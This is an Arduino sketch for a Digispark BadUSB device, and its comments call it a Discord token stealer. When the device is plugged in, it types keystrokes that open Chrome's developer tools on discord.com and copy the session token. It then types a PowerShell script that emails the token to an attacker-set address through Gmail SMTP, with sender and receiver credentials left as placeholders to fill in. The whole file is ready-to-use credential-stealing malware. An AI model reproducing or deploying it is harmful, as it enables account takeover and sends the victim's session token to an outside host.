#include "DigiKeyboard.h"
#include "avr/pgmspace.h"
#define GetPsz( x ) (strcpy_P(buffer, (char*)x))
char buffer[101];




//LINES TO EDIT
const char line1[] PROGMEM = "$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER EMAIL','SENDER EMAIL PASSWORD')";
const char line4[] PROGMEM = "$E.From = 'SENDER EMAIL'";
const char line5[] PROGMEM = "$E.To.Add('RECIEVER EMAIL')";
//END LINES TO EDIT




const char line2[] PROGMEM = "$SMTPServer = $E = New-Object System.Net.Mail.MailMessage";
const char line3[] PROGMEM = "$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)";

void setup() {}

void loop() {
  // Author: Guereak
  // Adapted for digispark by oven#8574
  // Digispark chrome discord token stealer for Windows 10
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("chrome");
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("discord.com");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);

  DigiKeyboard.sendKeyStroke(KEY_J, MOD_CONTROL_RIGHT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(48, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(48, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(48, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(48, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(48, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(48, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);

  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(82);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(82);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(82);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(82);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(82);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(82);     

  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(82);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(82);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(81);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(79);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(79);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("token");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(50);
  

  
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_CONTROL_LEFT);

 
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(50);
  
  
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(43);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_C,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(100);
  
  DigiKeyboard.sendKeyStroke(KEY_M, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  DigiKeyboard.delay(100);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$SMTPServer = 'smtp.gmail.com'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print( GetPsz (line3) );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$SMTPInfo.EnableSSL = $true");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print( GetPsz (line1) );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print( GetPsz (line2) );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print( GetPsz (line4) );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print( GetPsz (line5) );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$E.Subject = 'DISCORD TOKEN'");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(100);
  DigiKeyboard.print("$E.Body = ' ");
  DigiKeyboard.delay(50);
  
  DigiKeyboard.sendKeyStroke(KEY_V, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(50);
  DigiKeyboard.print(" '");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.print("$F = $SMTPInfo.Send($E)");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {
    /*empty*/
  }
}
